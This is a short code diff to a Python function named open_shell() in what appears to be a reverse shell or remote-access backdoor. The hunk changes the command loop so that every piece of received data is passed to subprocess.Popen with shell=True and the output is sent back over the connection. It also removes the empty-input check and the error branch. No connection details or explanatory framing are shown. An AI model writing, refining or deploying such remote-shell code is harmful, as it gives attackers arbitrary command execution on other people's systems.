@@ -48,11 +48,10 @@ def open_shell():
                 str_msg = "Error: " + str(sys.exc_info()[0])
             else:
                 str_msg = os.getcwd()
-        elif len(data.decode()) > 0:
+        else:
             output = subprocess.Popen(f'{data.decode()}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
             str_msg = output[0].decode()
-        else:
-            str_msg = "Error!"
+
 
         send(str_msg.encode())
 
